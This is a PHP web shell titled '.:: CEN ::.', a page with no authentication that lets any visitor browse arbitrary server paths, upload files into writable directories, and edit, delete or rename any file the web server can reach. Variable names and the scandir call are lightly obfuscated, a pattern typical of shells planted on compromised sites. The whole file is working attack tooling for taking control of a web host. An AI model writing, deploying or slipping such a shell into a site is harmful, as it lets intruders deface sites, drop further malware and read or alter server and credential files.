<?php

$x = isset($_GET['p']) ? base64_decode($_GET['p']) : getcwd();
$x = str_replace("\\", "/", $x); 
$y = explode("/", $x);

$z = function() use ($x, $y) {
    echo "<div class=\"dir\">";
    foreach ($y as $k => $v) {
        if ($v == "" && $k == 0) {
            echo "<a href=\"?p=" . base64_encode("/") . "\">/</a>";
            continue;
        }
        $path = "";
        for ($i = 0; $i <= $k; $i++) {
            $path .= $y[$i];
            if ($k !== $i) $path .= "/";
        }
        echo "<a href=\"?p=" . base64_encode($path) . "\">$v</a>/";
    }
    echo "</div>";
};
$z();

if (isset($_POST['t']) && isset($_FILES['f'])) {
    $f = $_FILES['f']['name'];
    $t = $_FILES['f']['tmp_name'];
    $d = rtrim($x, '/') . '/' . $f;
    if (!is_writable($x)) {
        echo "<script>alert('Error: Destination directory is not writable！');</script>";
    } elseif (move_uploaded_file($t, $d)) {
        echo "<script>alert('File uploaded successfully！'); window.location.href = '?p=" . base64_encode($x) . "';</script>";
    } else {
        $error = error_get_last();
        echo "<script>alert('Upload failed: " . htmlspecialchars($error['message']) . "');</script>";
    }
}


if (isset($_GET['edit'])) {
    $file_to_edit = base64_decode($_GET['edit']);
    if (file_exists($file_to_edit)) {
        $content = file_get_contents($file_to_edit);
        echo "<form method='post' action='?p=" . base64_encode($x) . "'>";
        echo "<input type='hidden' name='o' value='" . $_GET['edit'] . "'>";
        echo "<textarea name='c' style='width:100%;height:400px;'>" . htmlspecialchars($content) . "</textarea>";
        echo "<center><button type='submit' name='v' class='button1'>Save</button></center>";
        echo "</form>";
    } else {
        echo "<script>alert('File does not exist！');</script>";
    }
} else {

    $s = 'sc' . 'an' . 'dir';
    $l = $s($x);
    
    echo "<table id=\"fileTable\"><tr><th>Nama File / Folder</th><th>Size</th><th>Action</th></tr>";
    foreach ($l as $d2) {
        if (!is_dir($x . '/' . $d2) || $d2 == '.' || $d2 == '..') continue;
        echo "<tr><td><a href=\"?p=" . base64_encode("$x/$d2") . "\">$d2</a></td><td>--</td><td>NONE</td></tr>";
    }
    foreach ($l as $f3) {
        if (!is_file($x . '/' . $f3)) continue;
        $sz = filesize($x . '/' . $f3) / 1024;
        $sz = round($sz, 3);
        $sz_display = $sz >= 1024 ? round($sz / 1024, 2) . 'MB' : $sz . 'KB';
        $enc_path = base64_encode("$x/$f3");
        echo "<tr><td>$f3</td><td>$sz_display</td><td>"
            . "<a href=\"?delete=" . $enc_path . "\" class=\"button1\" onclick=\"return confirm('Delete this file?')\">Delete</a>"
            . "<a href=\"?p=" . base64_encode($x) . "&edit=" . $enc_path . "\" class=\"button1\">Edit</a>"
            . "<a href=\"?rename=" . $enc_path . "\" class=\"button1\">Rename</a>"
            . "</td></tr>";
    }
    echo "</table>";
}

if (isset($_GET['delete'])) {
    $file_to_delete = base64_decode($_GET['delete']);
    if (file_exists($file_to_delete) && unlink($file_to_delete)) {
        echo "<script>alert('Deleted successfully！'); window.location.href = '?p=" . base64_encode($x) . "';</script>";
    } else {
        echo "<script>alert('Deletion failed！');</script>";
    }
}

if (isset($_GET['rename'])) {
    $file_to_rename = base64_decode($_GET['rename']);
    if (file_exists($file_to_rename)) {
        echo "<form method='post' action='?p=" . base64_encode($x) . "'>";
        echo "<input type='hidden' name='r' value='" . $_GET['rename'] . "'>";
        echo "<input type='text' name='n' value='" . basename($file_to_rename) . "'>";
        echo "<button type='submit' name='rn' class='button1'>Rename</button>";
        echo "</form>";
    } else {
        echo "<script>alert('File does not exist！');</script>";
    }
}


if (isset($_POST['v'])) {
    $file_to_edit = base64_decode($_POST['o']);
    $new_content = $_POST['c'];
    if (is_writable($file_to_edit)) {
        $fp = fopen($file_to_edit, 'w');
        if ($fp && fwrite($fp, $new_content) !== false) {
            fclose($fp);
            echo "<script>alert('Saved successfully！'); window.location.href = '?p=" . base64_encode($x) . "';</script>";
        } else {
            echo "<script>alert('Failed to write file！');</script>";
        }
    } else {
        echo "<script>alert('File not writable！');</script>";
    }
}


if (isset($_POST['rn'])) {
    $file_to_rename = base64_decode($_POST['r']);
    $new_name = $_POST['n'];
    if (rename($file_to_rename, $x . '/' . $new_name)) {
        echo "<script>alert('Rename successfully！'); window.location.href = '?p=" . base64_encode($x) . "';</script>";
    } else {
        echo "<script>alert('Rename failed！');</script>";
    }
}
?>

<!DOCTYPE html>
<html>
<head><meta charset="utf-8">
    <title>.:: CEN ::.</title>
    <link href="https://fonts.googleapis.com/css2?family=Courgette&family=Cuprum:ital@1&family=Rowdies&display=swap" rel="stylesheet">
    <style>
        * { font-family: 'Cuprum', sans-serif; color: #000; }
        body { background-repeat: no-repeat; background-attachment: fixed; background-size: 100% 1700px; }
        .dir { text-align: center; font-size: 30px; }
        .dir a { text-decoration: none; color: #48D1CC; text-shadow: 1px 1px 1px #000; }
        .dir a:hover { color: red; }
        table { margin: 12px auto; border-collapse: collapse; font-size: 25px; }
        th { border: 1px solid #000; padding: 2px; color: #F0E68C; text-shadow: 1px 1px 1px #000; }
        td { border: 1px solid #000; padding: 8px; color: red; }
        td a { text-decoration: none; color: #8A2BE2; text-shadow: 1px 1px 1px #000; }
        td a:hover { color: red; }
        .button1 { width: 70px; height: 30px; background-color: #999; margin: 10px 3px; padding: 5px; color: #000; border-radius: 5px; border: 1px solid #000; box-shadow: .5px .5px .3px .3px #fff; cursor: pointer; display: inline-block; text-align: center; text-decoration: none; }
        .button1:hover { text-shadow: 0px 0px 5px #fff; box-shadow: .5px .5px .3px .3px #555; }
        textarea { border: 1px solid green; border-radius: 5px; box-shadow: 1px 1px 1px 1px #fff; width: 100%; height: 400px; padding-left: 10px; margin: 10px auto; resize: none; background: green; color: #ffffff; font-size: 13px; }
    </style>
</head>
<body>
    <div class="dir">
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="f"><input type="submit" name="t" value="Upload">
        </form>
    </div>
</body>
</html>